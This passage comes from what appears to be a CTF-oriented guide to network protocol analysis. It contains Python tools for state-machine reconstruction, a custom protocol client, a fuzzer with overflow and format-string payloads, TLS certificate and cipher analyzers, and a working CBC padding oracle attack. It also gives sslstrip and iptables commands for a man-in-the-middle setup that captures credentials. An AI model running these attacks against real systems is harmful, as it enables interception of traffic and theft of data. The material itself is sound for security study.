            elif isinstance(candidate, bytes) and candidate != b'\x00' * len(candidate):
                return candidate.hex()
        
        return None
    
    def analyze_conversation(self, pcap_file):
        """Analyze bidirectional protocol conversation"""
        packets = rdpcap(pcap_file)
        
        conversations = defaultdict(list)
        
        for pkt in packets:
            if IP in pkt and Raw in pkt:
                # Create conversation key (normalized)
                src = pkt[IP].src
                dst = pkt[IP].dst
                sport = pkt.sport if hasattr(pkt, 'sport') else 0
                dport = pkt.dport if hasattr(pkt, 'dport') else 0
                
                # Normalize conversation (ensure consistent ordering)
                conv_key = tuple(sorted([(src, sport), (dst, dport)]))
                
                direction = 'A->B' if (src, sport) == conv_key[0] else 'B->A'
                
                payload = bytes(pkt[Raw].load)
                msg_type = self.extract_message_type(payload)
                
                if msg_type:
                    conversations[conv_key].append({
                        'direction': direction,
                        'type': msg_type,
                        'length': len(payload),
                        'payload': payload
                    })
        
        # Build state machine from conversations
        for conv_key, messages in conversations.items():
            prev_state = 'START'
            
            for msg in messages:
                current_state = f"{msg['direction']}:{msg['type']}"
                self.transitions[prev_state][current_state] += 1
                self.states.add(prev_state)
                self.states.add(current_state)
                prev_state = current_state
        
        return conversations
    
    def visualize_state_machine(self, output_file='state_machine.png'):
        """Generate state machine diagram"""
        G = nx.DiGraph()
        
        for from_state, to_states in self.transitions.items():
            for to_state, count in to_states.items():
                G.add_edge(from_state, to_state, weight=count)
        
        pos = nx.spring_layout(G, k=2, iterations=50)
        
        plt.figure(figsize=(14, 10))
        
        # Draw nodes
        nx.draw_networkx_nodes(G, pos, node_color='lightblue', 
                              node_size=2000, alpha=0.9)
        
        # Draw edges with weights
        nx.draw_networkx_edges(G, pos, width=2, alpha=0.6, 
                              arrows=True, arrowsize=20)
        
        # Draw labels
        nx.draw_networkx_labels(G, pos, font_size=8)
        
        # Draw edge labels (transition counts)
        edge_labels = nx.get_edge_attributes(G, 'weight')
        nx.draw_networkx_edge_labels(G, pos, edge_labels, font_size=6)
        
        plt.title('Protocol State Machine')
        plt.axis('off')
        plt.tight_layout()
        plt.savefig(output_file, dpi=300, bbox_inches='tight')
        print(f"State machine diagram saved to {output_file}")
    
    def print_summary(self):
        """Print state machine summary"""
        print("\n=== Protocol State Machine Summary ===\n")
        print(f"Total states: {len(self.states)}")
        print(f"\nState Transitions:")
        
        for from_state, to_states in sorted(self.transitions.items()):
            print(f"\n  From: {from_state}")
            for to_state, count in sorted(to_states.items(), 
                                         key=lambda x: x[1], 
                                         reverse=True):
                print(f"    -> {to_state} ({count} occurrences)")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: state_machine_analyzer.py <pcap_file>")
        sys.exit(1)
    
    sm = ProtocolStateMachine()
    conversations = sm.analyze_conversation(sys.argv[1])
    
    print(f"Analyzed {len(conversations)} conversations")
    
    sm.print_summary()
    sm.visualize_state_machine()
```

### Implementing Protocol Clients

**Building Custom Protocol Client**

```python
#!/usr/bin/env python3
# custom_protocol_client.py - Interact with custom protocol server

import socket
import struct
import time
from enum import IntEnum

class MessageType(IntEnum):
    """Message types discovered through analysis"""
    HELLO = 0x01
    AUTH = 0x02
    COMMAND = 0x03
    RESPONSE = 0x04
    ERROR = 0x05
    GOODBYE = 0x06

class CustomProtocolClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.session_id = None
    
    def connect(self):
        """Establish connection to server"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.host, self.port))
        print(f"[+] Connected to {self.host}:{self.port}")
    
    def send_message(self, msg_type, payload=b''):
        """
        Send message with custom protocol format
        Format: [magic:4][type:1][length:2][payload:N][checksum:4]
        """
        magic = b'\xDE\xAD\xBE\xEF'
        msg_type_byte = bytes([msg_type])
        length = struct.pack('>H', len(payload))
        
        # Calculate checksum (simple sum for demonstration)
        checksum_data = magic + msg_type_byte + length + payload
        checksum = sum(checksum_data) & 0xFFFFFFFF
        checksum_bytes = struct.pack('>I', checksum)
        
        message = magic + msg_type_byte + length + payload + checksum_bytes
        
        self.sock.sendall(message)
        print(f"[>] Sent {msg_type.name}: {len(payload)} bytes")
        
        return message
    
    def receive_message(self):
        """Receive and parse message"""
        # Read header
        header = self.sock.recv(7)  # magic(4) + type(1) + length(2)
        
        if len(header) < 7:
            return None
        
        magic = header[:4]
        if magic != b'\xDE\xAD\xBE\xEF':
            print("[!] Invalid magic number")
            return None
        
        msg_type = header[4]
        payload_length = struct.unpack('>H', header[5:7])[0]
        
        # Read payload and checksum
        remaining = payload_length + 4  # payload + checksum
        data = b''
        while len(data) < remaining:
            chunk = self.sock.recv(remaining - len(data))
            if not chunk:
                break
            data += chunk
        
        payload = data[:payload_length]
        checksum_received = struct.unpack('>I', data[payload_length:])[0]
        
        # Verify checksum
        checksum_data = header + payload
        checksum_calculated = sum(checksum_data) & 0xFFFFFFFF
        
        if checksum_received != checksum_calculated:
            print(f"[!] Checksum mismatch: {checksum_received:08x} != {checksum_calculated:08x}")
        
        print(f"[<] Received {MessageType(msg_type).name}: {len(payload)} bytes")
        
        return {
            'type': MessageType(msg_type),
            'payload': payload,
            'checksum_valid': checksum_received == checksum_calculated
        }
    
    def handshake(self):
        """Perform protocol handshake"""
        # Send HELLO
        self.send_message(MessageType.HELLO, b'CTF_CLIENT_v1.0')
        
        # Receive response
        response = self.receive_message()
        
        if response and response['type'] == MessageType.RESPONSE:
            # Extract session ID from response (assumed format)
            self.session_id = struct.unpack('>I', response['payload'][:4])[0]
            print(f"[+] Session ID: {self.session_id:08x}")
            return True
        
        return False
    
    def authenticate(self, username, password):
        """Authenticate with server"""
        # Build auth payload: [session_id:4][user_len:1][user:N][pass_len:1][pass:N]
        payload = struct.pack('>I', self.session_id)
        payload += bytes([len(username)]) + username.encode()
        payload += bytes([len(password)]) + password.encode()
        
        self.send_message(MessageType.AUTH, payload)
        
        response = self.receive_message()
        
        if response and response['type'] == MessageType.RESPONSE:
            # Check auth status (first byte)
            if response['payload'][0] == 0x01:
                print("[+] Authentication successful")
                return True
        
        print("[-] Authentication failed")
        return False
    
    def send_command(self, command):
        """Send command to server"""
        payload = struct.pack('>I', self.session_id)
        payload += command.encode()
        
        self.send_message(MessageType.COMMAND, payload)
        
        response = self.receive_message()
        
        if response and response['type'] == MessageType.RESPONSE:
            return response['payload'].decode('utf-8', errors='ignore')
        
        return None
    
    def close(self):
        """Close connection gracefully"""
        if self.sock:
            try:
                self.send_message(MessageType.GOODBYE)
            except:
                pass
            self.sock.close()
            print("[+] Connection closed")

def main():
    """Example usage for CTF challenge"""
    client = CustomProtocolClient('ctf.example.com', 9999)
    
    try:
        # Connect and handshake
        client.connect()
        
        if not client.handshake():
            print("[-] Handshake failed")
            return
        
        # Try authentication
        if not client.authenticate('admin', 'password123'):
            # Try bruteforce or other auth method
            print("[*] Trying alternative authentication...")
        
        # Send commands to extract flag
        commands = [
            'STATUS',
            'LIST',
            'GET_FLAG',
            'DUMP_MEMORY'
        ]
        
        for cmd in commands:
            print(f"\n[*] Sending command: {cmd}")
            result = client.send_command(cmd)
            if result:
                print(f"[*] Response: {result}")
                
                # Check for flag pattern
                if 'CTF{' in result or 'FLAG{' in result:
                    print(f"\n[!] FLAG FOUND: {result}")
                    break
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        client.close()

if __name__ == '__main__':
    main()
```

### Protocol Fuzzing for Vulnerabilities

**Automated Protocol Fuzzer**

```python
#!/usr/bin/env python3
# protocol_fuzzer.py - Fuzz custom protocol for vulnerabilities

import socket
import struct
import random
import time
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

class ProtocolFuzzer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.crash_cases = []
    
    def create_fuzzed_message(self, msg_type, mutation_type='random'):
        """Generate fuzzed protocol message"""
        magic = b'\xDE\xAD\xBE\xEF'
        
        # Fuzz message type
        if mutation_type == 'invalid_type':
            msg_type_byte = bytes([random.randint(0x10, 0xFF)])
        else:
            msg_type_byte = bytes([msg_type])
        
        # Fuzz payload
        if mutation_type == 'overflow':
            # Buffer overflow attempt
            payload = b'A' * random.randint(1000, 10000)
        elif mutation_type == 'underflow':
            # Length field underflow
            payload = b'SHORT'
            length = struct.pack('>H', 0xFFFF)  # Large length, small payload
        elif mutation_type == 'format_string':
            # Format string injection
            payload = b'%x' * 100
        elif mutation_type == 'null_bytes':
            # Null byte injection
            payload = b'\x00' * random.randint(10, 100)
        elif mutation_type == 'special_chars':
            # Special characters
            special = b'\x00\x0a\x0d\xff\xfe' * 20
            payload = special
        else:
            # Random bytes
            payload = bytes([random.randint(0, 255) for _ in range(random.randint(10, 500))])
        
        # Fuzz length field
        if mutation_type == 'length_mismatch':
            length = struct.pack('>H', len(payload) + random.randint(-10, 50))
        else:
            length = struct.pack('>H', len(payload))
        
        # Fuzz checksum
        if mutation_type == 'bad_checksum':
            checksum = struct.pack('>I', random.randint(0, 0xFFFFFFFF))
        else:
            checksum_data = magic + msg_type_byte + length + payload
            checksum_value = sum(checksum_data) & 0xFFFFFFFF
            checksum = struct.pack('>I', checksum_value)
        
        message = magic + msg_type_byte + length + payload + checksum
        
        return message, mutation_type
    
    def test_message(self, message, mutation_desc):
        """Send fuzzed message and check for crashes"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.host, self.port))
            
            sock.sendall(message)
            
            # Try to receive response
            try:
                response = sock.recv(1024)
                sock.close()
                return {
                    'mutation': mutation_desc,
                    'status': 'normal',
                    'response_len': len(response)
                }
            except socket.timeout:
                sock.close()
                return {
                    'mutation': mutation_desc,
                    'status': 'timeout',
                    'response_len': 0
                }
        
        except ConnectionRefusedError:
            return {
                'mutation': mutation_desc,
                'status': 'crash_suspected',
                'response_len': 0
            }
        except Exception as e:
            return {
                'mutation': mutation_desc,
                'status': f'error: {type(e).__name__}',
                'response_len': 0
            }
    
    def fuzz(self, iterations=1000, threads=10):
        """Run fuzzing campaign"""
        print(f"[*] Starting fuzzing campaign: {iterations} iterations")
        
        mutation_types = [
            'random', 'overflow', 'underflow', 'format_string',
            'null_bytes', 'special_chars', 'invalid_type',
            'length_mismatch', 'bad_checksum'
        ]
        
        test_cases = []
        for i in range(iterations):
            msg_type = random.choice([0x01, 0x02, 0x03, 0x04])
            mutation = random.choice(mutation_types)
            message, desc = self.create_fuzzed_message(msg_type, mutation)
            test_cases.append((message, f"{i}_{desc}"))
        
        # Execute tests in parallel
        results = {'normal': 0, 'timeout': 0, 'crash': 0, 'error': 0}
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(self.test_message, msg, desc): desc 
                for msg, desc in test_cases
            }
            
            for i, future in enumerate(as_completed(futures)):
                result = future.result()
                
                if result['status'] == 'normal':
                    results['normal'] += 1
                elif result['status'] == 'timeout':
                    results['timeout'] += 1
                    print(f"[!] Timeout on: {result['mutation']}")
                elif 'crash' in result['status']:
                    results['crash'] += 1
                    self.crash_cases.append(result)
                    print(f"[!!!] CRASH DETECTED: {result['mutation']}")
                else:
                    results['error'] += 1
                
                if (i + 1) % 100 == 0:
                    print(f"[*] Progress: {i+1}/{iterations}")
        
        print("\n=== Fuzzing Results ===")
        print(f"Normal responses: {results['normal']}")
        print(f"Timeouts: {results['timeout']}")
        print(f"Crashes: {results['crash']}")
        print(f"Errors: {results['error']}")
        
        if self.crash_cases:
            print(f"\n[!] Found {len(self.crash_cases)} crash cases:")
            for crash in self.crash_cases:
                print(f"  - {crash['mutation']}")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 3:
        print("Usage: protocol_fuzzer.py <host> <port>")
        sys.exit(1)
    
    fuzzer = ProtocolFuzzer(sys.argv[1], int(sys.argv[2]))
    fuzzer.fuzz(iterations=1000, threads=10)
```

---

## Cryptographic Protocol Analysis

### TLS/SSL Analysis and Exploitation

**SSLStrip and Downgrade Attacks**

```bash
# Setup for MITM SSL stripping
# [Inference: Requires network position between client and server]

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure iptables for traffic redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 \
    -j REDIRECT --to-port 10000

# Run sslstrip
sslstrip -l 10000 -w sslstrip.log

# Monitor captured credentials
tail -f sslstrip.log
```

**TLS Certificate Analysis**

```python
#!/usr/bin/env python3
# tls_cert_analyzer.py - Extract and analyze TLS certificates from PCAP

from scapy.all import *
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import base64

def extract_certificates(pcap_file):
    """Extract X.509 certificates from TLS handshakes"""
    packets = rdpcap(pcap_file)
    
    certificates = []
    
    for pkt in packets:
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            
            # Look for TLS Certificate message (0x0b)
            if len(payload) > 5 and payload[0] == 0x16:  # Handshake
                # Check for Certificate handshake type
                if len(payload) > 9 and payload[5] == 0x0b:
                    try:
                        # Skip TLS record header (5 bytes) and handshake header (4 bytes)
                        cert_data = payload[9:]
                        
                        # Parse certificate length (3 bytes)
                        certs_length = int.from_bytes(cert_data[0:3], 'big')
                        cert_data = cert_data[3:]
                        
                        # Extract individual certificates
                        offset = 0
                        while offset < len(cert_data) - 3:
                            cert_length = int.from_bytes(cert_data[offset:offset+3], 'big')
                            offset += 3
                            
                            if offset + cert_length <= len(cert_data):
                                cert_bytes = cert_data[offset:offset+cert_length]
                                certificates.append(cert_bytes)
                                offset += cert_length
                            else:
                                break
                    
                    except Exception as e:
                        continue
    
    return certificates

def analyze_certificate(cert_bytes):
    """Analyze X.509 certificate"""
    try:
        cert = x509.load_der_x509_certificate(cert_bytes, default_backend())
        
        print("\n" + "="*60)
        print("Certificate Analysis")
        print("="*60)
        
        print(f"\nSubject: {cert.subject.rfc4514_string()}")
        print(f"Issuer: {cert.issuer.rfc4514_string()}")
        print(f"Serial Number: {cert.serial_number}")
        print(f"Valid From: {cert.not_valid_before}")
        print(f"Valid Until: {cert.not_valid_after}")
        print(f"Signature Algorithm: {cert.signature_algorithm_oid._name}")
        
        # Check for self-signed
        if cert.subject == cert.issuer:
            print("\n[!] Self-signed certificate detected")
        
        # Extract Subject Alternative Names
        try:
            san_ext = cert.extensions.get_extension_for_oid(
                x509.oid.ExtensionOID.SUBJECT_ALTERNATIVE_NAME
            )
            san_names = san_ext.value.get_values_for_type(x509.DNSName)
            print(f"\nSubject Alternative Names:")
            for name in san_names:
                print(f"  - {name}")
        except x509.ExtensionNotFound:
            pass
        
        # Extract public key
        public_key = cert.public_key()
        print(f"\nPublic Key Algorithm: {public_key.__class__.__name__}")
        
        if hasattr(public_key, 'key_size'):
            print(f"Key Size: {public_key.key_size} bits")
            
            # Warn about weak keys
            if public_key.key_size < 2048:
                print("[!] WARNING: Weak key size detected")
        
        return cert
    
    except Exception as e:
        print(f"[!] Error analyzing certificate: {e}")
        return None

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: tls_cert_analyzer.py <pcap_file>")
        sys.exit(1)
    
    print("[*] Extracting certificates from PCAP...")
    certs = extract_certificates(sys.argv[1])
    
    print(f"[+] Found {len(certs)} certificates")
    
    for i, cert_bytes in enumerate(certs):
        print(f"\n{'='*60}")
        print(f"Certificate #{i+1}")
        analyze_certificate(cert_bytes)
        
        # Save certificate to file for further analysis
        cert_file = f"cert_{i+1}.der"
        with open(cert_file, 'wb') as f:
            f.write(cert_bytes)
        print(f"\n[*] Certificate saved to: {cert_file}")
        
        # Convert to PEM for compatibility
        pem_file = f"cert_{i+1}.pem"
        import subprocess
        subprocess.run(['openssl', 'x509', '-inform', 'der', 
                       '-in', cert_file, '-out', pem_file], 
                       capture_output=True)
```

**TLS Session Key Extraction**

```python
#!/usr/bin/env python3
# tls_session_keys.py - Extract TLS session keys for decryption

import os
from scapy.all import *

def extract_premaster_secret(sslkeylog_file):
    """
    Parse SSL/TLS key log file (NSS Key Log Format)
    Format: CLIENT_RANDOM <client_random> <master_secret>
    """
    sessions = {}
    
    if not os.path.exists(sslkeylog_file):
        print(f"[!] Key log file not found: {sslkeylog_file}")
        return sessions
    
    with open(sslkeylog_file, 'r') as f:
        for line in f:
            line = line.strip()
            if line.startswith('CLIENT_RANDOM'):
                parts = line.split()
                if len(parts) == 3:
                    client_random = parts[1]
                    master_secret = parts[2]
                    sessions[client_random] = master_secret
    
    print(f"[+] Loaded {len(sessions)} session keys")
    return sessions

def decrypt_tls_with_wireshark(pcap_file, keylog_file, output_file):
    """
    Decrypt TLS traffic using Wireshark/tshark with session keys
    """
    cmd = [
        'tshark',
        '-r', pcap_file,
        '-o', f'tls.keylog_file:{keylog_file}',
        '-Y', 'http or tls',
        '-w', output_file
    ]
    
    import subprocess
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"[+] Decrypted traffic saved to: {output_file}")
    else:
        print(f"[!] Decryption failed: {result.stderr}")

def extract_http_from_decrypted(pcap_file):
    """Extract HTTP data from decrypted TLS traffic"""
    packets = rdpcap(pcap_file)
    
    http_requests = []
    http_responses = []
    
    for pkt in packets:
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            payload_str = payload.decode('utf-8', errors='ignore')
            
            # Check for HTTP request
            if payload_str.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')):
                http_requests.append(payload_str)
            
            # Check for HTTP response
            elif payload_str.startswith('HTTP/'):
                http_responses.append(payload_str)
    
    return http_requests, http_responses

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: tls_session_keys.py <pcap_file> [keylog_file]")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    keylog_file = sys.argv[2] if len(sys.argv) > 2 else 'sslkeylog.txt'
    
    # Extract session keys
    sessions = extract_premaster_secret(keylog_file)
    
    if sessions:
        # Decrypt traffic
        decrypted_pcap = 'decrypted_traffic.pcap'
        decrypt_tls_with_wireshark(pcap_file, keylog_file, decrypted_pcap)
        
        # Extract HTTP content
        requests, responses = extract_http_from_decrypted(decrypted_pcap)
        
        print(f"\n[+] Found {len(requests)} HTTP requests")
        print(f"[+] Found {len(responses)} HTTP responses")
        
        # Print sample requests
        print("\n=== Sample HTTP Requests ===")
        for req in requests[:3]:
            print(req[:200])
            print("...")
```

### Weak Cipher Detection and Exploitation

**Cipher Suite Analysis**

```python
#!/usr/bin/env python3
# cipher_suite_analyzer.py - Analyze TLS cipher suites

from scapy.all import *
import struct

# Known weak cipher suites
WEAK_CIPHERS = {
    0x0000: 'TLS_NULL_WITH_NULL_NULL',
    0x0001: 'TLS_RSA_WITH_NULL_MD5',
    0x0002: 'TLS_RSA_WITH_NULL_SHA',
    0x000A: 'TLS_RSA_WITH_3DES_EDE_CBC_SHA',  # Weak: 3DES
    0x0016: 'TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA',
    0x002F: 'TLS_RSA_WITH_AES_128_CBC_SHA',  # CBC mode (BEAST/Lucky13)
    0x0035: 'TLS_RSA_WITH_AES_256_CBC_SHA',
    0x009C: 'TLS_RSA_WITH_AES_128_GCM_SHA256',  # RSA key exchange (no PFS)
    0x009D: 'TLS_RSA_WITH_AES_256_GCM_SHA384',
}

EXPORT_CIPHERS = {
    0x0003: 'TLS_RSA_EXPORT_WITH_RC4_40_MD5',
    0x0006: 'TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5',
    0x0008: 'TLS_RSA_EXPORT_WITH_DES40_CBC_SHA',
    0x000B: 'TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA',
}

def analyze_client_hello(packet):
    """Parse TLS ClientHello and extract cipher suites"""
    if Raw not in packet:
        return None
    
    payload = bytes(packet[Raw].load)
    
    # Check for TLS Handshake (0x16)
    if len(payload) < 6 or payload[0] != 0x16:
        return None
    
    # Check for ClientHello (0x01)
    if payload[5] != 0x01:
        return None
    
    try:
        # Skip to cipher suites
        # Record header (5) + Handshake header (4) + Version (2) + Random (32) + Session ID length (1)
        offset = 5 + 4 + 2 + 32 + 1
        
        # Skip session ID
        session_id_length = payload[offset]
        offset += 1 + session_id_length
        
        # Parse cipher suites length
        cipher_suites_length = struct.unpack('>H', payload[offset:offset+2])[0]
        offset += 2
        
        # Extract cipher suites
        cipher_suites = []
        for i in range(0, cipher_suites_length, 2):
            if offset + i + 2 <= len(payload):
                cipher = struct.unpack('>H', payload[offset+i:offset+i+2])[0]
                cipher_suites.append(cipher)
        
        return cipher_suites
    
    except Exception as e:
        return None

def analyze_server_hello(packet):
    """Parse TLS ServerHello and extract selected cipher"""
    if Raw not in packet:
        return None
    
    payload = bytes(packet[Raw].load)
    
    if len(payload) < 6 or payload[0] != 0x16:
        return None
    
    if payload[5] != 0x02:  # ServerHello
        return None
    
    try:
        # Skip to cipher suite
        # Record (5) + Handshake (4) + Version (2) + Random (32) + Session ID length (1)
        offset = 5 + 4 + 2 + 32 + 1
        
        session_id_length = payload[offset]
        offset += 1 + session_id_length
        
        # Selected cipher suite
        cipher = struct.unpack('>H', payload[offset:offset+2])[0]
        
        return cipher
    
    except Exception as e:
        return None

def check_cipher_weakness(cipher_suite):
    """Identify cipher suite vulnerabilities"""
    issues = []
    
    if cipher_suite in EXPORT_CIPHERS:
        issues.append(('CRITICAL', 'Export-grade cipher (FREAK/Logjam vulnerable)'))
    
    if cipher_suite in WEAK_CIPHERS:
        issues.append(('HIGH', f'Weak cipher: {WEAK_CIPHERS[cipher_suite]}'))
    
    # Check for RC4
    cipher_name = WEAK_CIPHERS.get(cipher_suite, '')
    if 'RC4' in cipher_name:
        issues.append(('HIGH', 'RC4 cipher (deprecated, biased keystream)'))
    
    # Check for CBC mode
    if 'CBC' in cipher_name:
        issues.append(('MEDIUM', 'CBC mode (BEAST/Lucky13/Padding Oracle potential)'))
    
    # Check for MD5
    if 'MD5' in cipher_name:
        issues.append(('HIGH', 'MD5 hash (cryptographically broken)'))
    
    # Check for RSA key exchange (no forward secrecy)
    if 'RSA_WITH' in cipher_name and 'DHE' not in cipher_name and 'ECDHE' not in cipher_name:
        issues.append(('MEDIUM', 'RSA key exchange (no Perfect Forward Secrecy)'))
    
    return issues

def analyze_tls_traffic(pcap_file):
    """Analyze TLS traffic for weak ciphers"""
    packets = rdpcap(pcap_file)
    
    results = {
        'client_hellos': [],
        'server_hellos': [],
        'vulnerabilities': []
    }
    
    for pkt in packets:
        # Analyze ClientHello
        client_ciphers = analyze_client_hello(pkt)
        if client_ciphers:
            src_ip = pkt[IP].src if IP in pkt else 'unknown'
            results['client_hellos'].append({
                'src': src_ip,
                'ciphers': client_ciphers
            })
            
            # Check for weak ciphers offered
            for cipher in client_ciphers:
                if cipher in WEAK_CIPHERS or cipher in EXPORT_CIPHERS:
                    results['vulnerabilities'].append({
                        'type': 'client_offers_weak',
                        'src': src_ip,
                        'cipher': cipher
                    })
        
        # Analyze ServerHello
        server_cipher = analyze_server_hello(pkt)
        if server_cipher:
            src_ip = pkt[IP].src if IP in pkt else 'unknown'
            dst_ip = pkt[IP].dst if IP in pkt else 'unknown'
            
            results['server_hellos'].append({
                'server': src_ip,
                'client': dst_ip,
                'cipher': server_cipher
            })
            
            # Check selected cipher for weaknesses
            issues = check_cipher_weakness(server_cipher)
            if issues:
                for severity, description in issues:
                    results['vulnerabilities'].append({
                        'type': 'server_selected_weak',
                        'server': src_ip,
                        'cipher': server_cipher,
                        'severity': severity,
                        'description': description
                    })
    
    return results

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: cipher_suite_analyzer.py <pcap_file>")
        sys.exit(1)
    
    print("[*] Analyzing TLS cipher suites...\n")
    
    results = analyze_tls_traffic(sys.argv[1])
    
    print(f"[+] Found {len(results['client_hellos'])} ClientHello messages")
    print(f"[+] Found {len(results['server_hellos'])} ServerHello messages")
    print(f"[!] Found {len(results['vulnerabilities'])} potential vulnerabilities\n")
    
    if results['vulnerabilities']:
        print("=== Vulnerabilities Detected ===\n")
        
        for vuln in results['vulnerabilities']:
            if vuln['type'] == 'server_selected_weak':
                cipher_name = WEAK_CIPHERS.get(vuln['cipher'], 
                             EXPORT_CIPHERS.get(vuln['cipher'], f"0x{vuln['cipher']:04x}"))
                print(f"[{vuln['severity']}] Server {vuln['server']}")
                print(f"  Selected: {cipher_name}")
                print(f"  Issue: {vuln['description']}\n")
    
    # Print cipher suite statistics
    print("\n=== Cipher Suite Statistics ===\n")
    
    server_ciphers = [s['cipher'] for s in results['server_hellos']]
    from collections import Counter
    cipher_counts = Counter(server_ciphers)
    
    for cipher, count in cipher_counts.most_common():
        cipher_name = WEAK_CIPHERS.get(cipher, f"0x{cipher:04x}")
        print(f"{cipher_name}: {count} connections")
```

### Cryptographic Oracle Attacks

**Padding Oracle Attack Implementation**

```python
#!/usr/bin/env python3
# padding_oracle_attack.py - Exploit CBC padding oracle

import socket
import base64
from Crypto.Cipher import AES

class PaddingOracle:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def send_ciphertext(self, ciphertext):
        """
        Send ciphertext to server and check response
        Returns: True if padding valid, False if padding error
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            
            # Send ciphertext (base64 encoded)
            message = base64.b64encode(ciphertext) + b'\n'
            sock.sendall(message)
            
            # Receive response
            response = sock.recv(1024)
            sock.close()
            
            # Check for padding error indicator
            # [Inference: Server responses vary - adjust based on actual behavior]
            if b'Padding Error' in response or b'Invalid padding' in response:
                return False
            else:
                return True
        
        except Exception as e:
            return False
    
    def decrypt_block(self, ciphertext_block, previous_block):
        """
        Decrypt a single AES block using padding oracle
        """
        block_size = 16
        decrypted = bytearray(block_size)
        
        for pad_value in range(1, block_size + 1):
            # For each byte position (right to left)
            byte_position = block_size - pad_value
            
            # Try all possible byte values
            for guess in range(256):
                # Construct attack block
                attack_block = bytearray(previous_block)
                
                # Set known bytes to produce correct padding
                for i in range(byte_position + 1, block_size):
                    attack_block[i] = previous_block[i] ^ decrypted[i] ^ pad_value
                
                # Set current byte to test value
                attack_block[byte_position] = guess
                
                # Test if padding is valid
                test_ciphertext = bytes(attack_block) + ciphertext_block
                
                if self.send_ciphertext(test_ciphertext):
                    # Found valid padding
                    decrypted[byte_position] = guess ^ pad_value ^ previous_block[byte_position]
                    print(f"[+] Found byte {byte_position}: 0x{decrypted[byte_position]:02x}")
                    break
            else:
                print(f"[!] Failed to find byte {byte_position}")
                return None
        
        return bytes(decrypted)
    
    def decrypt(self, ciphertext):
        """Decrypt entire ciphertext using padding oracle"""
        block_size = 16
        
        if len(ciphertext) % block_size != 0:
            print("[!] Invalid ciphertext length")
            return None
        
        # Split into blocks
        blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
        
        plaintext = b''
        
        # Decrypt each block (skip IV/first block)
        for i in range(1, len(blocks)):
            print(f"\n[*] Decrypting block {i}/{len(blocks)-1}")
            
            decrypted_block = self.decrypt_block(blocks[i], blocks[i-1])
            
            if decrypted_block:
                plaintext += decrypted_block
            else:
                print(f"[!] Failed to decrypt block {i}")
                return None
        
        # Remove PKCS7 padding
        if plaintext:
            pad_length = plaintext[-1]
            plaintext = plaintext[:-pad_length]
        
        return plaintext

def main():
    """Example usage for CTF challenge"""
    import sys
    
    if len(sys.argv) != 4:
        print("Usage: padding_oracle_attack.py <host> <port> <ciphertext_base64>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    ciphertext_b64 = sys.argv[3]
    
    # Decode ciphertext
    ciphertext = base64.b64decode(ciphertext_b64)
    
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Ciphertext length: {len(ciphertext)} bytes")
    
    # Create oracle and decrypt
    oracle = PaddingOracle(host, port)
    plaintext = oracle.decrypt(ciphertext)
    
    if plaintext:
        print(f"\n[+] Decrypted plaintext:")
        print(plaintext.decode('utf-8', errors='ignore'))
        
        # Check for flag
        if b'CTF{' in plaintext or b'FLAG{' in plaintext:
            print(f"\n[!!!] FLAG FOUND: {plaintext}")
    else:
        print("\n[!] Decryption failed")

if __name__ == '__main__':
    main()
```

### SSH Protocol Analysis

**SSH Traffic Analysis**

```python
#!/usr/bin/env python3
# ssh_analyzer.py - Analyze SSH protocol exchanges

from scapy.all import *
import struct

def parse_ssh_packet(payload):
    """Parse SSH packet structure"""
    if len(payload) < 6:
        return None
    
    try:
        # SSH packet: [length:4][padding_length:1][payload:N][padding:P][MAC:M]
        packet_length = struct.unpack('>I', payload[:4])[0]
        padding_length = payload[4]
        
        # Extract message type (first byte of payload)
        message_type = payload[5]
        
        return {
            'packet_length': packet_length,
            'padding_length': padding_length,
            'message_type': message_type,
            'full_payload': payload
        }
    except Exception as e:
        return None

def identify_ssh_message_type(msg_type):
    """Identify SSH message type"""
    ssh_messages = {
        1: 'SSH_MSG_DISCONNECT',
        2: 'SSH_MSG_IGNORE',
        3: 'SSH_MSG_UNIMPLEMENTED',
        4: 'SSH_MSG_DEBUG',
        5: 'SSH_MSG_SERVICE_REQUEST',
        6: 'SSH_MSG_SERVICE_ACCEPT',
        20: 'SSH_MSG_KEXINIT',
        21: 'SSH_MSG_NEWKEYS',
        30: 'SSH_MSG_KEXDH_INIT',
        31: 'SSH_MSG_KEXDH_REPLY',
        50: 'SSH_MSG_USERAUTH_REQUEST',
        51: 'SSH_MSG_USERAUTH_FAILURE',
        52: 'SSH_MSG_USERAUTH_SUCCESS',
        53: 'SSH_MSG_USERAUTH_BANNER',
        60: 'SSH_MSG_USERAUTH_PK_OK',
        90: 'SSH_MSG_CHANNEL_OPEN',
        91: 'SSH_MSG_CHANNEL_OPEN_CONFIRMATION',
        92: 'SSH_MSG_CHANNEL_OPEN_FAILURE',
